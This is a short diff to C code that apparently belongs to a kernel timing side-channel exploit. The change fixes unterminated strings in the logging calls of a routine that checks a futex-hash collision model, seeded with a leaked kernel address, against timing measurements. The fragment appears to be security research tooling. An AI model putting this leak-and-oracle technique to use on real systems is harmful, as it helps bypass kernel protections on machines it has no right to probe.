@@ -825,7 +825,7 @@ uintptr_t prepare_kernel_page(int payload_mode, size_t cand_round) {
     size_t T = (size_t)&ks->inc_futex[128];
     uint32_t bT = futex_hash(T, leaked);
     size_t agree = 0, disagree = 0, tested_c = 0, tested_m = 0;
-    pr_info("[OVAL] mm=%016zx modelBucket(T)=%u\n, leaked, bT);
+    pr_info("[OVAL] mm=%016zx modelBucket(T)=%u\n", leaked, bT);
     __increase(ks, 128, APPENDED_FUTEXES);
     for (size_t i = 2; i < ks->total_futexes; ++i) {
       size_t id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
@@ -841,19 +841,19 @@ uintptr_t prepare_kernel_page(int payload_mode, size_t cand_round) {
       int oracle = (tA > 3 * tB + 8);
       if (pred) {
         tested_c++;
-        pr_info("[OVAL] pred=COLLIDE addr=%zx tA=%zu tB=%zu oracle=%d\n,
+        pr_info("[OVAL] pred=COLLIDE addr=%zx tA=%zu tB=%zu oracle=%d\n",
                 c, tA, tB, oracle);
         if (oracle) agree++; else disagree++;
       } else {
         tested_m++;
-        pr_info("[OVAL] pred=MISS    addr=%zx tA=%zu tB=%zu oracle=%d\n,
+        pr_info("[OVAL] pred=MISS    addr=%zx tA=%zu tB=%zu oracle=%d\n",
                 c, tA, tB, oracle);
         if (!oracle) agree++; else disagree++;
       }
       if (disagree) break; /* model broken - stop early */
       __increase(ks, 128, APPENDED_FUTEXES);
     }
-    pr_info("[OVAL] RESULT agree=%zu disagree=%zu (collide=%zu miss=%zu)\n,
+    pr_info("[OVAL] RESULT agree=%zu disagree=%zu (collide=%zu miss=%zu)\n",
             agree, disagree, tested_c, tested_m);
     kernelsnitch_cleanup(ks);
     ks = NULL;
